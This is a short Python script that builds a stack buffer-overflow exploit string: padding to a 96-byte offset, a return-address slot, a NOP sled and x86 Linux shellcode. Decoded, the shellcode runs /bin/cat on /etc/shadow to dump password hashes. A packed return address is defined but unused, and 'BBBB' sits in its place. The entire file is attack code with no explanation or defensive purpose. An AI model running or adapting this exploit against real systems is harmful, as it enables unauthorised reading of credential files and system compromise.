import struct

offset = 96
rp = struct.pack("<L", 0x565555c7)

nop = "\x90"

payload = ""
payload += "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68"
payload += "\x2f\x62\x69\x6e\x89\xe3\x50\x68\x61"
payload += "\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68"
payload += "\x2f\x65\x74\x63\x89\xe1\x50\x51\x53"
payload += "\x89\xe1\xb0\x0b\xcd\x80"

exploit = ""
exploit += "A" * offset
exploit += "BBBB"
exploit += nop * 200
exploit += payload

print(exploit)
